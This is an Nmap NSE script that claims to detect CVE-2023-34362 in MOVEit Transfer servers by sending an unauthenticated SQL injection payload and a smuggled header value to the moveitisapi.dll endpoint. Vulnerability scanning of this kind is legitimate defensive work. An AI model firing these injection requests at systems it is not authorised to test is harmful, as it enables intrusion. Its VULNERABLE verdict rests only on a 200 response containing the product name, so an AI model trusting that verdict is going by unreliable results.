-- Script for detecting CVE-2023-34362 in MOVEit Transfer
--
-- Description:
-- This script attempts to detect the presence of CVE-2023-34362 in MOVEit Transfer servers by performing an unauthenticated SQL injection.
--
-- Usage:
-- nmap --script moveit_transfer_cve-2023-34362.nse -p <port> <target>

local http = require "http"
local shortport = require "shortport"
local stdnse = require "stdnse"
local nmap = require "nmap"
local vulns = require "vulns"

description = [[
Detects CVE-2023-34362 in MOVEit Transfer servers by attempting an unauthenticated SQL injection.
]]

---
-- @usage
-- nmap --script moveit_transfer_cve-2023-34362.nse -p <port> <target>
--
-- @output
-- PORT   STATE SERVICE
-- 443/tcp open  https
-- | moveit_transfer_cve-2023-34362:
-- |   VULNERABLE:
-- |     MOVEit Transfer SQL Injection (CVE-2023-34362)
-- |     State: VULNERABLE
-- |     IDs:  CVE-2023-34362
-- |     Description:
-- |       MOVEit Transfer is vulnerable to unauthenticated SQL injection that allows remote attackers to execute arbitrary SQL commands.
-- |     References:
-- |_      https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis

author = "Your Name"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"vuln"}

portrule = shortport.http

action = function(host, port)
    local vuln = {
        title = "MOVEit Transfer SQL Injection (CVE-2023-34362)",
        state = "UNKNOWN",
        description = "MOVEit Transfer is vulnerable to unauthenticated SQL injection that allows remote attackers to execute arbitrary SQL commands.",
        references = {
            "https://attackerkb.com/topics/mXmV0YpC3W/cve-2023-34362/rapid7-analysis"
        }
    }

    local target = string.format("https://%s:%d/moveitisapi/moveitisapi.dll?action=m2", host.ip, port.number)
    local injection_payload = "0' OR 1=1 -- "

    stdnse.print_debug(1, "Checking %s for CVE-2023-34362", target)

    local response = http.get(target, {
        ["User-Agent"] = "Mozilla/5.0",
        ["X-siLock-Test"] = "abcdX-SILOCK-Transaction: folder_add_by_path",
        ["X-siLock-Transaction"] = injection_payload
    })

    if not response then
        return
    end

    if response.status == 200 and response.body:find("MOVEit Transfer") then
        vuln.state = "VULNERABLE"
    else
        vuln.state = "SAFE"
    end

    return vulns.report(host, port, vuln)
end
